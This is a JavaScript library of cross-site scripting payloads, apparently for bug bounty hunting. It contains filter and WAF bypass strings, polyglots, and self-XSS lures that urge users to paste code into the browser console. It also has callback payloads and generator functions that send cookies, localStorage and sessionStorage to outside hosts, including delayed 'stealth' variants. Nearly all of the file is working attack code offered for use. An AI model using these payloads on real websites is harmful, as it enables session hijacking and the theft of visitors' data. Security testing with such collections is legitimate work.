/**
 * XSS Hunter static javascript payload collection
 * Bug bounty XSS payloads with some bypass techniques
 * 
 * Features:
 * - Self-XSS exploitation techniques
 * - DOM-based XSS payloads
 * - Filter bypass methods
 * - Event handler exploitation
 * - Encoding bypass techniques
 * - Context-aware payloads
 * - Modern browser exploitation
 */

// Core XSS Hunter Configuration
const XSS_HUNTER_DOMAIN = 'https://example.bxss.in or https://js.rip/example';
const CUSTOM_DOMAIN = 'https://six.icu';

// Utility Functions for Payload Generation
const XSSUtils = {
    // Generate random string for unique identification
    generateId: () => Math.random().toString(36).substring(2, 15),
    
    // Base64 encode payload
    b64encode: (str) => btoa(str),
    
    // URL encode payload
    urlEncode: (str) => encodeURIComponent(str),
    
    // HTML entity encode
    htmlEncode: (str) => str.replace(/[&<>"']/g, (m) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
    })[m]),
    
    // String.fromCharCode encoding
    charCodeEncode: (str) => str.split('').map(c => c.charCodeAt(0)).join(','),
    
    // Hex encoding
    hexEncode: (str) => str.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
    
    // Unicode encoding
    unicodeEncode: (str) => str.split('').map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('')
};

// Basic XSS Payloads Collection
const BasicPayloads = {
    // Standard alert payloads
    alert: [
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '<script>alert(document.domain)</script>',
        '<script>alert(document.cookie)</script>',
        '<script>alert(window.location)</script>'
    ],
    
    // Confirm payloads
    confirm: [
        '<script>confirm(1)</script>',
        '<script>confirm("XSS Found")</script>',
        '<script>confirm(document.domain)</script>'
    ],
    
    // Prompt payloads
    prompt: [
        '<script>prompt(1)</script>',
        '<script>prompt("XSS")</script>',
        '<script>prompt(document.domain)</script>'
    ]
};

// Advanced Filter Bypass Payloads
const BypassPayloads = {
    // Case variation bypasses
    caseVariation: [
        '<ScRiPt>alert(1)</ScRiPt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<script>ALERT(1)</script>',
        '<Script>Alert(1)</Script>'
    ],
    
    // Null byte injection
    nullByte: [
        '<script\x00>alert(1)</script>',
        '<script>alert\x00(1)</script>',
        '<img src=x onerror=alert\x00(1)>'
    ],
    
    // Tab and newline bypasses
    whitespace: [
        '<script\t>alert(1)</script>',
        '<script\n>alert(1)</script>',
        '<script\r>alert(1)</script>',
        '<script\f>alert(1)</script>',
        '<script\v>alert(1)</script>',
        '<script\x0b>alert(1)</script>',
        '<script\x0c>alert(1)</script>'
    ],
    
    // Comment bypasses
    comments: [
        '<script>/**/alert(1)</script>',
        '<script>alert/**/(1)</script>',
        '<script>alert(/**/1)</script>',
        '<script>//\nalert(1)</script>'
    ],
    
    // String concatenation bypasses
    concatenation: [
        '<script>alert("XS"+"S")</script>',
        '<script>alert("X"+"S"+"S")</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>alert(atob("WFNT"))</script>'
    ]
};

// Event Handler Payloads
const EventHandlerPayloads = {
    // Mouse events
    mouse: [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<div onmouseover=alert(1)>XSS</div>',
        '<div onclick=alert(1)>Click me</div>',
        '<div onmouseenter=alert(1)>Hover me</div>',
        '<div onmouseleave=alert(1)>Leave me</div>',
        '<div onmousedown=alert(1)>Press me</div>',
        '<div onmouseup=alert(1)>Release me</div>'
    ],
    
    // Keyboard events
    keyboard: [
        '<input onkeydown=alert(1)>',
        '<input onkeyup=alert(1)>',
        '<input onkeypress=alert(1)>',
        '<textarea onfocus=alert(1)></textarea>',
        '<input onblur=alert(1)>',
        '<input onchange=alert(1)>',
        '<input oninput=alert(1)>'
    ],
    
    // Form events
    form: [
        '<form onsubmit=alert(1)><input type=submit></form>',
        '<input onselect=alert(1) value="Select this">',
        '<select onchange=alert(1)><option>1</option><option>2</option></select>',
        '<button onclick=alert(1)>Click</button>'
    ],
    
    // Media events
    media: [
        '<audio onloadstart=alert(1) src=x>',
        '<video onloadstart=alert(1) src=x>',
        '<audio onerror=alert(1) src=x>',
        '<video onerror=alert(1) src=x>',
        '<audio oncanplay=alert(1) src=x>',
        '<video oncanplay=alert(1) src=x>'
    ],
    
    // Window events
    window: [
        '<body onresize=alert(1)>',
        '<body onscroll=alert(1)>',
        '<body onhashchange=alert(1)>',
        '<body onpopstate=alert(1)>',
        '<body onstorage=alert(1)>',
        '<body onoffline=alert(1)>',
        '<body ononline=alert(1)>'
    ]
};

// Encoding Bypass Payloads
const EncodingPayloads = {
    // HTML entity encoding
    htmlEntities: [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
        '&lt;img src=x onerror=alert(1)&gt;'
    ],
    
    // URL encoding
    urlEncoded: [
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
        '%3Csvg%20onload%3Dalert(1)%3E'
    ],
    
    // Double URL encoding
    doubleUrlEncoded: [
        '%253Cscript%253Ealert(1)%253C/script%253E',
        '%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E'
    ],
    
    // Unicode encoding
    unicode: [
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        '\\u003cimg src=x onerror=alert(1)\\u003e'
    ],
    
    // Hex encoding
    hex: [
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        '\\x3cimg src=x onerror=alert(1)\\x3e'
    ]
};

// Context-Specific Payloads
const ContextPayloads = {
    // JavaScript context
    javascript: [
        'alert(1)',
        'alert("XSS")',
        'alert(document.domain)',
        'alert(document.cookie)',
        'confirm(1)',
        'prompt(1)',
        'console.log("XSS")',
        'eval("alert(1)")',
        'Function("alert(1)")()',
        'setTimeout("alert(1)",0)',
        'setInterval("alert(1)",1000)'
    ],
    
    // HTML attribute context
    attribute: [
        '" onmouseover="alert(1)',
        '\' onmouseover=\'alert(1)',
        '" onclick="alert(1)" "',
        '\' onclick=\'alert(1)\' \'',
        '" onfocus="alert(1)" autofocus="',
        '\' onfocus=\'alert(1)\' autofocus=\''
    ],
    
    // CSS context
    css: [
        'expression(alert(1))',
        'url(javascript:alert(1))',
        'url("javascript:alert(1)")',
        'url(\'javascript:alert(1)\')',
        'behavior:url(#default#userData)',
        'background:url(javascript:alert(1))'
    ],
    
    // URL context
    url: [
        'javascript:alert(1)',
        'javascript:alert("XSS")',
        'javascript:alert(document.domain)',
        'javascript:alert(document.cookie)',
        'javascript:confirm(1)',
        'javascript:prompt(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
    ]
};

// DOM-based XSS Payloads
const DOMPayloads = {
    // Location-based
    location: [
        'location.hash.slice(1)',
        'location.search.slice(1)',
        'location.pathname',
        'document.URL',
        'document.documentURI',
        'document.baseURI'
    ],
    
    // Document methods
    document: [
        'document.write(location.hash.slice(1))',
        'document.writeln(location.search.slice(1))',
        'document.body.innerHTML = location.hash.slice(1)',
        'document.getElementById("x").innerHTML = location.search.slice(1)'
    ],
    
    // eval-based
    eval: [
        'eval(location.hash.slice(1))',
        'eval(location.search.slice(1))',
        'Function(location.hash.slice(1))()',
        'setTimeout(location.hash.slice(1), 0)',
        'setInterval(location.search.slice(1), 1000)'
    ]
};

// Self-XSS Exploitation Payloads
const SelfXSSPayloads = {
    // Social engineering vectors
    socialEngineering: [
        'console.log("Press F12 and paste this: alert(document.cookie)")',
        'console.log("Copy and paste this in console: " + btoa("alert(1)"))',
        'console.log("Debug mode: eval(atob(\\"YWxlcnQoMSk=\\"))")'
    ],
    
    // Clipboard manipulation
    clipboard: [
        'navigator.clipboard.writeText("alert(1)").then(() => console.log("Payload copied to clipboard"))',
        'document.addEventListener("paste", e => eval(e.clipboardData.getData("text")))'
    ],
    
    // Console manipulation
    console: [
        'console.clear(); console.log("%cSecurity Check", "color: red; font-size: 20px;"); console.log("Paste this: alert(1)");',
        'console.log("%cWARNING", "color: red; font-weight: bold; font-size: 50px;"); console.log("Execute: eval(atob(\\"YWxlcnQoMSk=\\"))");'
    ]
};

// Advanced Bypass Techniques
const AdvancedBypass = {
    // Template literals
    templateLiterals: [
        '`${alert(1)}`',
        '`${alert`1`}`',
        '`${eval`alert(1)`}`',
        '`${Function`alert(1)``}`'
    ],
    
    // Destructuring
    destructuring: [
        '[alert][0](1)',
        '[alert,...rest][0](1)',
        '{alert}=window;alert(1)',
        'const{alert}=window;alert(1)'
    ],
    
    // Proxy objects
    proxy: [
        'new Proxy({},{get:()=>alert})()(1)',
        'new Proxy(alert,{})(1)'
    ],
    
    // Symbol manipulation
    symbols: [
        'Symbol.for("alert")',
        'window[Symbol.for("alert")](1)'
    ],
    
    // Prototype pollution
    prototypePollution: [
        'Object.prototype.toString=alert',
        'Array.prototype.join=alert',
        'String.prototype.valueOf=alert'
    ]
};

// WAF Bypass Payloads
const WAFBypass = {
    // CloudFlare bypasses
    cloudflare: [
        '<svg/onload=alert(1)>',
        '<img src=x onerror=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<object data=javascript:alert(1)>',
        '<embed src=javascript:alert(1)>'
    ],
    
    // ModSecurity bypasses
    modsecurity: [
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>alert(/XSS/.source)</script>',
        '<script>alert(atob("WFNT"))</script>',
        '<script>alert(unescape("%58%53%53"))</script>'
    ],
    
    // AWS WAF bypasses
    awsWaf: [
        '<script>alert`1`</script>',
        '<script>(alert)(1)</script>',
        '<script>window["alert"](1)</script>',
        '<script>window["ale"+"rt"](1)</script>'
    ],
    
    // Generic WAF bypasses
    generic: [
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<script>eval(unescape("%61%6c%65%72%74%28%31%29"))</script>',
        '<script>Function("ale"+"rt(1)")()</script>'
    ]
};

// Browser-Specific Payloads
const BrowserSpecific = {
    // Chrome/Chromium
    chrome: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<object data=javascript:alert(1)>'
    ],
    
    // Firefox
    firefox: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<object data=javascript:alert(1)>'
    ],
    
    // Safari
    safari: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<object data=javascript:alert(1)>'
    ],
    
    // Internet Explorer
    ie: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<object data=javascript:alert(1)>',
        '<embed src=javascript:alert(1)>'
    ],
    
    // Edge
    edge: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<object data=javascript:alert(1)>'
    ]
};

// XSS Hunter Integration Payloads
const XSSHunterPayloads = {
    // Basic XSS Hunter callback
    basic: [
        `<script src="${XSS_HUNTER_DOMAIN}"></script>`,
        `<script>fetch("${XSS_HUNTER_DOMAIN}?"+document.cookie)</script>`,
        `<img src="${XSS_HUNTER_DOMAIN}?cookie="+document.cookie>`,
        `<iframe src="${XSS_HUNTER_DOMAIN}?data="+btoa(document.cookie)></iframe>`
    ],
    
    // Advanced data exfiltration
    advanced: [
        `<script>fetch("${XSS_HUNTER_DOMAIN}",{method:"POST",body:JSON.stringify({url:location.href,cookie:document.cookie,localStorage:localStorage,sessionStorage:sessionStorage})})</script>`,
        `<script>new Image().src="${XSS_HUNTER_DOMAIN}?"+btoa(JSON.stringify({domain:document.domain,cookie:document.cookie,url:location.href}))</script>`,
        `<script>navigator.sendBeacon("${XSS_HUNTER_DOMAIN}",JSON.stringify({cookie:document.cookie,url:location.href,referrer:document.referrer}))</script>`
    ],
    
    // Stealth payloads
    stealth: [
        `<script>setTimeout(()=>fetch("${XSS_HUNTER_DOMAIN}?"+document.cookie),5000)</script>`,
        `<script>document.addEventListener("click",()=>fetch("${XSS_HUNTER_DOMAIN}?"+document.cookie))</script>`,
        `<script>window.addEventListener("beforeunload",()=>navigator.sendBeacon("${XSS_HUNTER_DOMAIN}",document.cookie))</script>`
    ]
};

// Polyglot Payloads (work in multiple contexts)
const PolyglotPayloads = [
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//\'>',
    'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>',
    'javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle=alert()>',
    '"><script>alert(document.domain)</script>',
    '\';alert(String.fromCharCode(88,83,83));//\';alert(String.fromCharCode(88,83,83));//";alert(String.fromCharCode(88,83,83));//";alert(String.fromCharCode(88,83,83));//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
];

// Payload Generator Functions
const PayloadGenerator = {
    // Generate random payload from category
    random: (category) => {
        const payloads = category[Math.floor(Math.random() * category.length)];
        return Array.isArray(payloads) ? payloads[Math.floor(Math.random() * payloads.length)] : payloads;
    },
    
    // Generate encoded payload
    encoded: (payload, encoding = 'url') => {
        switch(encoding) {
            case 'url': return XSSUtils.urlEncode(payload);
            case 'html': return XSSUtils.htmlEncode(payload);
            case 'base64': return XSSUtils.b64encode(payload);
            case 'hex': return XSSUtils.hexEncode(payload);
            case 'unicode': return XSSUtils.unicodeEncode(payload);
            default: return payload;
        }
    },
    
    // Generate custom XSS Hunter payload
    xssHunter: (data = 'document.cookie') => {
        return `<script>fetch("${XSS_HUNTER_DOMAIN}?data="+encodeURIComponent(${data}))</script>`;
    },
    
    // Generate custom domain payload
    customDomain: (data = 'document.cookie') => {
        return `<script>fetch("https://${CUSTOM_DOMAIN}?data="+encodeURIComponent(${data}))</script>`;
    }
};

// Export all payloads for use
const XSSPayloads = {
    BasicPayloads,
    BypassPayloads,
    EventHandlerPayloads,
    EncodingPayloads,
    ContextPayloads,
    DOMPayloads,
    SelfXSSPayloads,
    AdvancedBypass,
    WAFBypass,
    BrowserSpecific,
    XSSHunterPayloads,
    PolyglotPayloads,
    PayloadGenerator,
    XSSUtils
};

// Auto-execute payload for immediate testing
if (typeof window !== 'undefined') {
    console.log('XSS Payload Library Loaded');
    console.log('Available categories:', Object.keys(XSSPayloads));
    console.log('Use XSSPayloads.PayloadGenerator.random(XSSPayloads.BasicPayloads.alert) for random payload');
}

// Node.js export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = XSSPayloads;
}
